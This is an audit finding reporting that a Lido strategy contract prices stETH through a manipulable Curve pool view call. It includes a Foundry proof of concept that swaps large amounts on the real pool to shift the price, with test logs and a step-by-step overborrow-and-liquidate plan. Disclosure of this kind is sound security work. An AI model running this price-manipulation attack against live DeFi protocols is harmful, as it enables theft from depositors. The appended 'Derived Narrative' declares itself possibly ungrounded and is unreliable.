---
id: 19065
severity: "High"
---

# `LidoEthStrategy._currentBalance` is subject to price manipulation, allows overborrowing and liquidations

## Description

The strategy is pricing stETH as ETH by asking the pool for it’s return value

This is easily manipulatable by performing a swap big enough

```solidity
function _currentBalance() internal view override returns (uint256 amount) {
    uint256 stEthBalance = stEth.balanceOf(address(this));
    uint256 calcEth = stEthBalance > 0
        ? curveStEthPool.get_dy(1, 0, stEthBalance) // TODO: Prob manipulatable view-reentrancy
        : 0;
    uint256 queued = wrappedNative.balanceOf(address(this));
    return calcEth + queued;
}

/// @dev deposits to Lido or queues tokens if the 'depositThreshold' has not been met yet
function _deposited(uint256 amount) internal override nonReentrant {
    uint256 queued = wrappedNative.balanceOf(address(this));
    if (queued > depositThreshold) {
        require(!stEth.isStakingPaused(), "LidoStrategy: staking paused");
        INative(address(wrappedNative)).withdraw(queued);
        stEth.submit{value: queued}(address(0)); //1:1 between eth<>stEth // TODO: Prob cheaper to buy stETH
        emit AmountDeposited(queued);
        return;
    }
    emit AmountQueued(amount);
}
```

## Proof of Concept

* Imbalance the Pool to overvalue the stETH
  * Overborrow and Make the Singularity Insolvent
  * Imbalance the Pool to undervalue the stETH
  * Liquidate all Depositors (at optimal premium since attacker can control the price change)

Logs

[PASS] testSwapStEth() (gas: 372360)  
  Initial Price 5443663537732571417920  
  Changed Price 2187071651284977907921  
  Initial Price 2187071651284977907921  
  Changed Price 1073148438886623970

[PASS] testSwapETH() (gas: 300192)  
Logs:  
  value 100000000000000000000000  
  Initial Price 5443663537732571417920  
  Changed Price 9755041616702274912586  
  value 700000000000000000000000  
  Initial Price 9755041616702274912586  
  Changed Price 680711874102963551173181

Considering that swap fees are 1BPS, the attack is profitable at very low TVL

```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console2.sol";

interface ICurvePoolWeird {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);
}

interface ICurvePool {
    function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);
    function remove_liquidity(uint256 _amount, uint256[2] memory _min_amounts) external returns (uint256[2] memory);

    function get_virtual_price() external view returns (uint256);
    function remove_liquidity_one_coin(uint256 _token_amount, int128 i, uint256 _min_amount) external;

    function get_dy(int128 i, int128 j, uint256 dx) external view returns (uint256);
    function exchange(int128 i, int128 j, uint256 dx, uint256 min_dy) external payable returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

contract Swapper is Test {
    ICurvePool pool = ICurvePool(0xDC24316b9AE028F1497c275EB9192a3Ea0f67022);
    IERC20 stETH = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    uint256 TEN_MILLION_USD_AS_ETH = 5455e18; // Rule of thumb is 1BPS cost means we can use 5 Billion ETH and still be

    function swapETH() external payable {
        console2.log("value", msg.value);
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        pool.exchange{value: msg.value}(0, 1, msg.value, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));
    }

    function swapStEth() external {
        console2.log("Initial Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));

        // Always approve exact ;)
        uint256 amt = stETH.balanceOf(address(this));
        stETH.approve(address(pool), stETH.balanceOf(address(this)));

        pool.exchange(1, 0, amt, 0); // Swap all yolo

        // curveStEthPool.get_dy(1, 0, stEthBalance)
        console2.log("Changed Price", pool.get_dy(1, 0, TEN_MILLION_USD_AS_ETH));
    }

    receive() external payable {}
}

contract CompoundedStakesFuzz is Test {
    Swapper c;
    IERC20 token = IERC20(0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84);

    function setUp() public {
        c = new Swapper();
    }

    function testSwapETH() public {
        deal(address(this), 100_000e18);
        c.swapETH{value: 100_000e18}(); /// 100k ETH is enough to double the price

        deal(address(this), 700_000e18);
        c.swapETH{value: 700_000e18}(); /// 700k ETH is enough to double the price
    }
    function testSwapStEth() public {
        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Has 700k ETH, 100k is sufficient
        token.transfer(address(c), 100_000e18);
        c.swapStEth();

        vm.prank(0x1982b2F5814301d4e9a8b0201555376e62F82428); // AAVE stETH // Another one for good measure
        token.transfer(address(c), 600_000e18);
        c.swapStEth();
    }
}
```

## Recommendation

Use the Chainlink stETH / ETH Price Feed or Ideally do not expose the strategy to any conversion, simply deposit and withdraw stETH directly to avoid any risk or attack in conversions

<https://data.chain.link/arbitrum/mainnet/crypto-eth/steth-eth>

<https://data.chain.link/ethereum/mainnet/crypto-eth/steth-eth>

## Derived Narrative

The following field is derived content and may not be source-grounded:

The vulnerability originates from the strategy’s reliance on a Curve pool view function to price stETH as ETH. The internal _currentBalance routine reads the contract’s stETH balance and calls curveStEthPool.get_dy(1,0,stEthBalance) to compute an equivalent ETH amount, then adds any queued native tokens. Because get_dy returns a value that reflects the current pool state, an attacker who can perform a sufficiently large swap on the pool can artificially inflate or deflate the reported price of stETH. By inflating the price, the strategy’s view of its holdings becomes larger than the real underlying value, allowing the contract to over‑borrow assets or to accept deposits under false pretenses. Conversely, deflating the price enables the attacker to trigger liquidations of honest depositors at a premium that the attacker controls. The exploit is profitable even with modest total value locked because swap fees are only one basis point, so a relatively small amount of ETH or stETH can shift the price dramatically, as demonstrated by the test logs where a 100 k ETH swap doubled the price. The impact is that the protocol can become insolvent, honest users may see their balances reduced to zero or receive no refund, and the accounting assumptions that stETH is worth a 1:1 amount of ETH are violated. The condition for the attack is that the depositThreshold has been met, causing the strategy to invoke the price conversion, and that an adversary can execute a large swap before the view is taken. The issue was discovered during a Code4rena audit through targeted fuzzing that performed large swaps and observed the resulting price distortion. It is hard to notice because the function is marked view and appears to be a harmless read‑only conversion, leading developers to trust its output as immutable. The recommended mitigation is to replace the manipulable pool price with a trusted oracle such as the Chainlink stETH/ETH feed, or to avoid any conversion altogether by keeping assets in stETH and withdrawing directly, thereby eliminating the attack surface.
